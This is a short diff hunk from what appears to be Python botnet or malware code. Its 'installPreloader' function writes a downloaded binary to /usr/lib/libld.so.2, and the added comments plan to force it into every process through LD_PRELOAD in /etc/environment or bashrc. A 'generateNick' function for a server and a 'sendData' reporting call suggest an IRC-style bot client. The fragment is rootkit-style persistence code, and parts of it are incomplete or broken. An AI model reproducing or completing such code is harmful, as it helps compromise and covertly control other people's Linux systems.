@@ -49,7 +49,10 @@ def installPreloader(): #downloads preload binary
 	f = open('/usr/lib/libld.so.2')
 	f.write(data)
 	f.close()
-	sendData("The preloader was installed.")
+	#need to add LD_PRELOAD="/usr/lib/libld.so.2" to environment variables somehow.
+	#^ /etc/bashrc /etc/environment /etc/bash.bashrc?
+	#os.system("")
+	#sendData("The preloader was installed.")
 
 def generateNick(operatingSystem): #generates a nick for the server
 	if not operatingSystem:
